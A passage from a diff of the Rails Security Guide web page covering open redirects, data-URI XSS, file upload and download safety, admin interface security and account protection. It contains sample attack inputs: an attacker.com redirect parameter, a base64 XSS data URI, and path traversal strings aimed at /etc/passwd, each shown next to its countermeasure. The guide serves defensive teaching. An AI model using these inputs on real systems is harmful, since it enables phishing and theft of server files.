+<button class="clipboard-button" data-clipboard-target="#clipboard-5536471b20cab0c77247fb2dd00a68cf">Copiar</button>
 </div>
-<p>The above method can be placed in the <code>ApplicationController</code> and will be called when a CSRF token is not present or is incorrect on a non-GET request.</p><p>Note that <em>cross-site scripting (XSS) vulnerabilities bypass all CSRF protections</em>. XSS gives the attacker access to all elements on a page, so they can read the CSRF security token from a form or directly submit the form. Read <a href="#cross-site-scripting-xss">more about XSS</a> later.</p><h3 id="redirection-and-files"><a class="anchorlink" href="#redirection-and-files">4 Redirection and Files</a></h3><p>Another class of security vulnerabilities surrounds the use of redirection and files in web applications.</p><h4 id="redirection"><a class="anchorlink" href="#redirection">4.1 Redirection</a></h4><div class="warning"><p><em>Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap web site, they may also create a self-contained attack.</em></p></div><p>Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: <a href="http://www.example.com/site/redirect?to=www.attacker.com">http://www.example.com/site/redirect?to=www.attacker.com</a>. Here is an example of a legacy action:</p><div class="code_container">
+<p>The above method can be placed in the <code>ApplicationController</code> and will be called when a CSRF token is not present or is incorrect on a non-GET request.</p><p>Note that <em>cross-site scripting (XSS) vulnerabilities bypass all CSRF protections</em>. XSS gives the attacker access to all elements on a page, so they can read the CSRF security token from a form or directly submit the form. Read <a href="#cross-site-scripting-xss">more about XSS</a> later.</p><h3 id="redirection-and-files"><a class="anchorlink" href="#redirection-and-files">4 Redirection and Files</a></h3><p>Another class of security vulnerabilities surrounds the use of redirection and files in web applications.</p><h4 id="redirection"><a class="anchorlink" href="#redirection">4.1 Redirection</a></h4><div class="warning"><p><em>Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap website, they may also create a self-contained attack.</em></p></div><p>Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: <a href="http://www.example.com/site/redirect?to=www.attacker.com">http://www.example.com/site/redirect?to=www.attacker.com</a>. Here is an example of a legacy action:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="k">def</span> <span class="nf">legacy</span>
   <span class="n">redirect_to</span><span class="p">(</span><span class="n">params</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">action</span><span class="ss">:'main'</span><span class="p">))</span>
 <span class="k">end</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-f7910288cff2d3ab497d0767216514a1">def legacy
+<textarea class="clipboard-content" id="clipboard-60e0cc89cc75d2bb83a7b06bdd2fa015">def legacy
   redirect_to(params.update(action:'main'))
 end
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-f7910288cff2d3ab497d0767216514a1">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-60e0cc89cc75d2bb83a7b06bdd2fa015">Copiar</button>
 </div>
 <p>This will redirect the user to the main action if they tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can be exploited by attacker if they included a host key in the URL:</p><div class="code_container">
 <pre><code class="highlight plaintext">http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-5a6a584eabbecdaf6d4fdae281659e69">http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com
+<textarea class="clipboard-content" id="clipboard-c77bcae6414c4cbd784343a633636e22">http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-5a6a584eabbecdaf6d4fdae281659e69">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-c77bcae6414c4cbd784343a633636e22">Copiar</button>
 </div>
-<p>If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to <em>include only the expected parameters in a legacy action</em> (again a permitted list approach, as opposed to removing unexpected parameters). <em>And if you redirect to a URL, check it with a permitted list or a regular expression</em>.</p><h5 id="self-contained-xss"><a class="anchorlink" href="#self-contained-xss">4.1.1 Self-contained XSS</a></h5><p>Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:</p><p><code>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</code></p><p>This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, <em>do not allow the user to supply (parts of) the URL to be redirected to</em>.</p><h4 id="file-uploads"><a class="anchorlink" href="#file-uploads">4.2 File Uploads</a></h4><div class="note"><p><em>Make sure file uploads don't overwrite important files, and process media files asynchronously.</em></p></div><p>Many web applications allow users to upload files. <em>File names, which the user may choose (partly), should always be filtered</em> as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like "../../../etc/passwd", it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so - one more reason to run web servers, database servers, and other programs as a less privileged Unix user.</p><p>When filtering user input file names, <em>don't try to remove malicious parts</em>. Think of a situation where the web application removes all "../" in a file name and an attacker uses a string such as "....//" - the result will be "../". It is best to use a permitted list approach, which <em>checks for the validity of a file name with a set of accepted characters</em>. This is opposed to a restricted list approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the <a href="https://github.com/technoweenie/attachment_fu/tree/master">attachment_fu plugin</a>:</p><div class="code_container">
+<p>If it is at the end of the URL it will hardly be noticed and redirects the user to the <code>attacker.com</code> host. As a general rule, passing user input directly into <code>redirect_to</code> is considered dangerous. A simple countermeasure would be to <em>include only the expected parameters in a legacy action</em> (again a permitted list approach, as opposed to removing unexpected parameters). <em>And if you redirect to a URL, check it with a permitted list or a regular expression</em>.</p><h5 id="self-contained-xss"><a class="anchorlink" href="#self-contained-xss">4.1.1 Self-contained XSS</a></h5><p>Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:</p><p><code>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</code></p><p>This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, <em>do not allow the user to supply (parts of) the URL to be redirected to</em>.</p><h4 id="file-uploads"><a class="anchorlink" href="#file-uploads">4.2 File Uploads</a></h4><div class="note"><p><em>Make sure file uploads don't overwrite important files, and process media files asynchronously.</em></p></div><p>Many web applications allow users to upload files. <em>File names, which the user may choose (partly), should always be filtered</em> as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like "../../../etc/passwd", it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so - one more reason to run web servers, database servers, and other programs as a less privileged Unix user.</p><p>When filtering user input file names, <em>don't try to remove malicious parts</em>. Think of a situation where the web application removes all "../" in a file name and an attacker uses a string such as "....//" - the result will be "../". It is best to use a permitted list approach, which <em>checks for the validity of a file name with a set of accepted characters</em>. This is opposed to a restricted list approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the <a href="https://github.com/technoweenie/attachment_fu/tree/master">attachment_fu plugin</a>:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="k">def</span> <span class="nf">sanitize_filename</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
   <span class="n">filename</span><span class="p">.</span><span class="nf">strip</span><span class="p">.</span><span class="nf">tap</span> <span class="k">do</span> <span class="o">|</span><span class="nb">name</span><span class="o">|</span>
     <span class="c1"># NOTE: File.basename doesn't work right with Windows paths on Unix</span>
@@ -602,7 +600,7 @@ end
   <span class="k">end</span>
 <span class="k">end</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-5984617ae296d5345badbcdb5b0b3f0c">def sanitize_filename(filename)
+<textarea class="clipboard-content" id="clipboard-546f1d2c5d825cb8519c6069ceee16f2">def sanitize_filename(filename)
   filename.strip.tap do |name|
     # NOTE: File.basename doesn't work right with Windows paths on Unix
     # get only the filename, not the whole path
@@ -613,14 +611,14 @@ end
   end
 end
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-5984617ae296d5345badbcdb5b0b3f0c">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-546f1d2c5d825cb8519c6069ceee16f2">Copiar</button>
 </div>
-<p>A significant disadvantage of synchronous processing of file uploads (as the attachment_fu plugin may do with images), is its <em>vulnerability to denial-of-service attacks</em>. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.</p><p>The solution to this is best to <em>process media files asynchronously</em>: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.</p><h4 id="executable-code-in-file-uploads"><a class="anchorlink" href="#executable-code-in-file-uploads">4.3 Executable Code in File Uploads</a></h4><div class="warning"><p><em>Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails' /public directory if it is Apache's home directory.</em></p></div><p>The popular Apache web server has an option called DocumentRoot. This is the home directory of the web site, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file "file.cgi" with code in it, which will be executed when someone downloads the file.</p><p><em>If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it</em>, store files at least one level upwards.</p><h4 id="file-downloads"><a class="anchorlink" href="#file-downloads">4.4 File Downloads</a></h4><div class="note"><p><em>Make sure users cannot download arbitrary files.</em></p></div><p>Just as you have to filter file names for uploads, you have to do so for downloads. The <code>send_file()</code> method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:</p><div class="code_container">
+<p>A significant disadvantage of synchronous processing of file uploads (as the <code>attachment_fu</code> plugin may do with images), is its <em>vulnerability to denial-of-service attacks</em>. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.</p><p>The solution to this is best to <em>process media files asynchronously</em>: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.</p><h4 id="executable-code-in-file-uploads"><a class="anchorlink" href="#executable-code-in-file-uploads">4.3 Executable Code in File Uploads</a></h4><div class="warning"><p><em>Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails' /public directory if it is Apache's home directory.</em></p></div><p>The popular Apache web server has an option called DocumentRoot. This is the home directory of the website, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file "file.cgi" with code in it, which will be executed when someone downloads the file.</p><p><em>If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it</em>, store files at least one level upwards.</p><h4 id="file-downloads"><a class="anchorlink" href="#file-downloads">4.4 File Downloads</a></h4><div class="note"><p><em>Make sure users cannot download arbitrary files.</em></p></div><p>Just as you have to filter file names for uploads, you have to do so for downloads. The <code>send_file()</code> method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">send_file</span><span class="p">(</span><span class="s1">'/var/www/uploads/'</span> <span class="o">+</span> <span class="n">params</span><span class="p">[</span><span class="ss">:filename</span><span class="p">])</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-66ccad100f95304b38c3540279c1c313">send_file('/var/www/uploads/' + params[:filename])
+<textarea class="clipboard-content" id="clipboard-ce359443b704094a51ca34c3627dcfe3">send_file('/var/www/uploads/' + params[:filename])
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-66ccad100f95304b38c3540279c1c313">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-ce359443b704094a51ca34c3627dcfe3">Copiar</button>
 </div>
 <p>Simply pass a file name like "../../../etc/passwd" to download the server's login information. A simple solution against this, is to <em>check that the requested file is in the expected directory</em>:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">basename</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="s1">'../../files'</span><span class="p">,</span> <span class="n">__dir__</span><span class="p">)</span>
@@ -629,45 +627,22 @@ end
      <span class="no">File</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">dirname</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="s1">'../../../'</span><span class="p">))</span>
 <span class="n">send_file</span> <span class="n">filename</span><span class="p">,</span> <span class="ss">disposition: </span><span class="s1">'inline'</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-e672e36c99afecf94edf0a8ddd9ae6a9">basename = File.expand_path('../../files', __dir__)
+<textarea class="clipboard-content" id="clipboard-708197d36afdf4ffd1f0b53510ed8234">basename = File.expand_path('../../files', __dir__)
 filename = File.expand_path(File.join(basename, @file.public_filename))
 raise if basename !=
      File.expand_path(File.join(File.dirname(filename), '../../../'))
 send_file filename, disposition: 'inline'
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-e672e36c99afecf94edf0a8ddd9ae6a9">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-708197d36afdf4ffd1f0b53510ed8234">Copiar</button>
 </div>
-<p>Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file to be executed. The attachment_fu plugin does this in a similar way.</p><h3 id="intranet-and-admin-security"><a class="anchorlink" href="#intranet-and-admin-security">5 Intranet and Admin Security</a></h3><p>Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world.</p><p>In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the "Monster for employers" web site of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF.</p><p><strong>XSS</strong> If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.</p><p>Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator's cookie, injecting an iframe to steal the administrator's password or installing malicious software through browser security holes to take over the administrator's computer.</p><p>Refer to the Injection section for countermeasures against XSS.</p><p><strong>CSRF</strong> Cross-Site Request Forgery (CSRF), also known as Cross-Site Reference Forgery (XSRF), is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.</p><p>A real-world example is a <a href="http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html">router reconfiguration by CSRF</a>. The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for the user, but it also contained an image tag that resulted in an HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake web site and had their credentials stolen.</p><p>Another example changed Google Adsense's e-mail address and password. If the victim was logged into Google Adsense, the administration interface for Google advertisement campaigns, an attacker could change the credentials of the victim.</p><p>Another popular attack is to spam your web application, your blog, or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.</p><p>For <em>countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section</em>.</p><h4 id="additional-precautions"><a class="anchorlink" href="#additional-precautions">5.1 Additional Precautions</a></h4><p>The common admin interface works like this: it's located at <a href="http://www.example.com/admin">www.example.com/admin</a>, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:</p>
+<p>Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file to be executed. The <code>attachment_fu</code> plugin does this in a similar way.</p><h3 id="intranet-and-admin-security"><a class="anchorlink" href="#intranet-and-admin-security">5 Intranet and Admin Security</a></h3><p>Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world.</p><p>In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the "Monster for employers" website of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF.</p><p><strong>XSS</strong> If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.</p><p>Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator's cookie, injecting an iframe to steal the administrator's password or installing malicious software through browser security holes to take over the administrator's computer.</p><p>Refer to the Injection section for countermeasures against XSS.</p><p><strong>CSRF</strong> Cross-Site Request Forgery (CSRF), also known as Cross-Site Reference Forgery (XSRF), is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.</p><p>A real-world example is a <a href="http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html">router reconfiguration by CSRF</a>. The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for the user, but it also contained an image tag that resulted in an HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake website and had their credentials stolen.</p><p>Another example changed Google Adsense's e-mail address and password. If the victim was logged into Google Adsense, the administration interface for Google advertisement campaigns, an attacker could change the credentials of the victim.</p><p>Another popular attack is to spam your web application, your blog, or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.</p><p>For <em>countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section</em>.</p><h4 id="additional-precautions"><a class="anchorlink" href="#additional-precautions">5.1 Additional Precautions</a></h4><p>The common admin interface works like this: it's located at <a href="http://www.example.com/admin">www.example.com/admin</a>, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:</p>
 <ul>
 <li><p>It is very important to <em>think about the worst case</em>: What if someone really got hold of your cookies or user credentials. You could <em>introduce roles</em> for the admin interface to limit the possibilities of the attacker. Or how about <em>special login credentials</em> for the admin interface, other than the ones used for the public part of the application. Or a <em>special password for very serious actions</em>?</p></li>
 <li><p>Does the admin really have to access the interface from everywhere in the world? Think about <em>limiting the login to a bunch of source IP addresses</em>. Examine request.remote_ip to find out about the user's IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.</p></li>
 <li><p><em>Put the admin interface to a special subdomain</em> such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, <a href="http://www.application.com">www.application.com</a>, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on <a href="http://www.application.com">www.application.com</a> may not read the cookie for admin.application.com and vice-versa.</p></li>
 </ul>
-<h3 id="user-management"><a class="anchorlink" href="#user-management">6 User Management</a></h3><div class="note"><p><em>Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure.</em></p></div><p>There are a number of authentication plug-ins for Rails available. Good ones, such as the popular <a href="https://github.com/plataformatec/devise">devise</a> and <a href="https://github.com/binarylogic/authlogic">authlogic</a>, store only encrypted passwords, not plain-text passwords. In Rails 3.1 you can use the built-in <code>has_secure_password</code> method which has similar features.</p><p>Every new user gets an activation code to activate their account when they get an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested a URL like these, they would be logged in as the first activated user found in the database (and chances are that this is the administrator):</p><div class="code_container">
-<pre><code class="highlight plaintext">http://localhost:3006/user/activate
-http://localhost:3006/user/activate?id=
-</code></pre>
-<textarea class="clipboard-content" id="clipboard-f78fe0480ee769d5319f08104ca3e7bc">http://localhost:3006/user/activate
-http://localhost:3006/user/activate?id=
-</textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-f78fe0480ee769d5319f08104ca3e7bc">Copiar</button>
-</div>
-<p>This is possible because on some servers, this way the parameter id, as in params[:id], would be nil. However, here is the finder from the activation action:</p><div class="code_container">
-<pre><code class="highlight ruby"><span class="no">User</span><span class="p">.</span><span class="nf">find_by_activation_code</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:id</span><span class="p">])</span>
-</code></pre>
-<textarea class="clipboard-content" id="clipboard-f9e3f73d33dbee5fb15d4698dece65d2">User.find_by_activation_code(params[:id])
-</textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-f9e3f73d33dbee5fb15d4698dece65d2">Copiar</button>
-</div>
-<p>If the parameter was nil, the resulting SQL query will be</p><div class="code_container">
-<pre><code class="highlight sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="p">(</span><span class="n">users</span><span class="p">.</span><span class="n">activation_code</span> <span class="k">IS</span> <span class="k">NULL</span><span class="p">)</span> <span class="k">LIMIT</span> <span class="mi">1</span>
-</code></pre>
-<textarea class="clipboard-content" id="clipboard-c835fdfdb1215ac8ed61c3fe13ffae4d">SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
-</textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-c835fdfdb1215ac8ed61c3fe13ffae4d">Copiar</button>
-</div>
-<p>And thus it found the first user in the database, returned it, and logged them in. You can find out more about it in <a href="http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/">this blog post</a>. <em>It is advisable to update your plug-ins from time to time</em>. Moreover, you can review your application to find more flaws like this.</p><h4 id="brute-forcing-accounts"><a class="anchorlink" href="#brute-forcing-accounts">6.1 Brute-Forcing Accounts</a></h4><div class="note"><p><em>Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a CAPTCHA.</em></p></div><p>A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user names and a dictionary, an automatic program may find the correct password in a matter of minutes.</p><p>Because of this, most web applications will display a generic error message "user name or password not correct", if one of these are not correct. If it said "the user name you entered has not been found", an attacker could automatically compile a list of user names.</p><p>However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered user name or e-mail address has (not) been found. This allows an attacker to compile a list of user names and brute-force the accounts.</p><p>In order to mitigate such attacks, <em>display a generic error message on forgot-password pages, too</em>. Moreover, you can <em>require to enter a CAPTCHA after a number of failed logins from a certain IP address</em>. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.</p><h4 id="account-hijacking"><a class="anchorlink" href="#account-hijacking">6.2 Account Hijacking</a></h4><p>Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?.</p><h5 id="passwords"><a class="anchorlink" href="#passwords">6.2.1 Passwords</a></h5><p>Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring them to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, <em>make change-password forms safe against CSRF</em>, of course. And <em>require the user to enter the old password when changing it</em>.</p><h5 id="e-mail"><a class="anchorlink" href="#e-mail">6.2.2 E-Mail</a></h5><p>However, the attacker may also take over the account by changing the e-mail address. After they change it, they will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. As a countermeasure <em>require the user to enter the password when changing the e-mail address, too</em>.</p><h5 id="other"><a class="anchorlink" href="#other">6.2.3 Other</a></h5><p>Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in <a href="https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">Google Mail</a>. In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in an HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to their e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, <em>review your application logic and eliminate all XSS and CSRF vulnerabilities</em>.</p><h4 id="captchas"><a class="anchorlink" href="#captchas">6.3 CAPTCHAs</a></h4><div class="info"><p><em>A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect registration forms from attackers and comment forms from automatic spam bots by asking the user to type the letters of a distorted image. This is the positive CAPTCHA, but there is also the negative CAPTCHA. The idea of a negative CAPTCHA is not for a user to prove that they are human, but reveal that a robot is a robot.</em></p></div><p>A popular positive CAPTCHA API is <a href="https://developers.google.com/recaptcha/">reCAPTCHA</a> which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. <a href="https://github.com/ambethia/recaptcha/">ReCAPTCHA</a> is also a Rails plug-in with the same name as the API.</p><p>You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
-The problem with CAPTCHAs is that they have a negative impact on the user experience. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. Still, positive CAPTCHAs are one of the best methods to prevent all kinds of bots from submitting forms.</p><p>Most bots are really dumb. They crawl the web and put their spam into every form's field they can find. Negative CAPTCHAs take advantage of that and include a "honeypot" field in the form which will be hidden from the human user by CSS or JavaScript.</p><p>Note that negative CAPTCHAs are only effective against dumb bots and won't suffice to protect critical applications from targeted bots. Still, the negative and positive CAPTCHAs can be combined to increase the performance, e.g., if the "honeypot" field is not empty (bot detected), you won't need to verify the positive CAPTCHA, which would require an HTTPS request to Google ReCaptcha before computing the response.</p><p>Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:</p>
+<h3 id="user-management"><a class="anchorlink" href="#user-management">6 User Management</a></h3><div class="note"><p><em>Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure.</em></p></div><p>There are a number of authentication plug-ins for Rails available. Good ones, such as the popular <a href="https://github.com/heartcombo/devise">devise</a> and <a href="https://github.com/binarylogic/authlogic">authlogic</a>, store only cryptographically hashed passwords, not plain-text passwords. Since Rails 3.1 you can also use the built-in <a href="https://api.rubyonrails.org/v7.0.0/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password"><code>has_secure_password</code></a> method which supports secure password hashing, confirmation, and recovery mechanisms.</p><h4 id="brute-forcing-accounts"><a class="anchorlink" href="#brute-forcing-accounts">6.1 Brute-Forcing Accounts</a></h4><div class="note"><p><em>Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a CAPTCHA.</em></p></div><p>A list of usernames for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of usernames and a dictionary, an automatic program may find the correct password in a matter of minutes.</p><p>Because of this, most web applications will display a generic error message "username or password not correct", if one of these are not correct. If it said "the username you entered has not been found", an attacker could automatically compile a list of usernames.</p><p>However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered username or e-mail address has (not) been found. This allows an attacker to compile a list of usernames and brute-force the accounts.</p><p>In order to mitigate such attacks, <em>display a generic error message on forgot-password pages, too</em>. Moreover, you can <em>require to enter a CAPTCHA after a number of failed logins from a certain IP address</em>. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.</p><h4 id="account-hijacking"><a class="anchorlink" href="#account-hijacking">6.2 Account Hijacking</a></h4><p>Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?.</p><h5 id="passwords"><a class="anchorlink" href="#passwords">6.2.1 Passwords</a></h5><p>Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring them to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, <em>make change-password forms safe against CSRF</em>, of course. And <em>require the user to enter the old password when changing it</em>.</p><h5 id="e-mail"><a class="anchorlink" href="#e-mail">6.2.2 E-Mail</a></h5><p>However, the attacker may also take over the account by changing the e-mail address. After they change it, they will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. As a countermeasure <em>require the user to enter the password when changing the e-mail address, too</em>.</p><h5 